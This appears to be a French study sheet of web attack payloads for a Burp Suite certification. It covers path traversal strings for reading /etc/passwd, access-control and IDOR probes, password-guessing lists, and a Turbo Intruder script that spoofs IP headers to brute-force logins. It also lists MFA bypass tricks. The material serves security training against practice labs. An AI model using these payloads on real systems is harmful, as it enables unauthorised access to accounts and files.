---
tags: [bscp, essentiel, payloads]
statut: en cours
---
# Fiche de payloads par vulnérabilité

### Path traversal ([[Path-traversal]])
- `../../../etc/passwd` — traversal simple (Unix)
- `..\..\..\windows\win.ini` — traversal simple (Windows)
- `....//` ou `....\/` — séquences imbriquées (contournement d'un retrait non récursif de `../`)
- `%2e%2e%2f` — encodage simple
- `%252e%252e%252f` — double encodage
- `%c0%af` ou `..%ef%bc%8f` — encodage non standard
- `filename=/var/www/images/../../../etc/passwd` — contournement validation de préfixe (chemin absolu)
- `filename=../../../etc/passwd%00.png` — contournement validation d'extension (null byte)
- Liste Burp Intruder dédiée : **Fuzzing - path traversal**

### Access control ([[Access-control]])
- `/admin`, `/administrator-panel-<suffixe>` — accès direct à une fonction non liée dans l'UI
- `/robots.txt`, `/sitemap.xml` — emplacements où chercher une URL sensible divulguée (voir aussi le code JS de l'interface)
- `?admin=true`, `?role=1` — contournement par paramètre de rôle contrôlable côté client
- `?id=123` → `?id=124`, `?id=1` — escalade horizontale / IDOR par manipulation d'identifiant, à tester sous un compte différent
- `GET` / `POST` / `PUT` / `DELETE` sur le même endpoint — ne pas se limiter au verbe HTTP utilisé par l'UI

### Authentication ([[Authentication]])
- `admin`, `administrator`, `prenom.nom@domaine` — noms d'utilisateur à tester en priorité
- `Password1!`, `Passw0rd`, `<motclé><année>!` — mutations de mot de passe prévisibles (substitutions leet : `o`→`0`, `a`→`4`, `e`→`3`)
- `X-Forwarded-For: <ip aléatoire>` — contournement de blocage IP (tester aussi `X-Real-IP`, `X-Client-IP`, `True-Client-IP`)
- `Authorization: Basic base64(username:password)` — authentification HTTP Basic
- Script Turbo Intruder pour bypass de blocage IP (1 seul marqueur position password, IP injectée par remplacement de texte sur `target.req`) :
  ```python
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                              concurrentConnections=1,
                              requestsPerConnection=1,
                              pipeline=False
                              )

      for password in wordlists.clipboard:
          ip = "%d.%d.%d.%d" % (
              randint(1, 255), randint(1, 255), randint(1, 255), randint(1, 255)
          )
          req = target.req.replace("1.1.1.1", ip)
          engine.queue(req, password)


  def handleResponse(req, interesting):
      table.add(req)
  ```

### Multi-factor authentication ([[Multi-factor-authentication]])
- `Cookie: account=carlos` → `Cookie: account=victim-user` — manipulation du cookie de liaison d'identité entre étapes
- `0000`-`9999` ou `000000`-`999999` — brute force du code de vérification (Burp Intruder, attaque Sniper, payload type Numbers)
- `"verified":false` → `"verified":true` — réponse de vérification à surveiller/manipuler si la décision est côté client
- `/my-account` — accès direct après l'étape 1, en forçant la navigation vers une URL post-connexion sans jamais soumettre le code
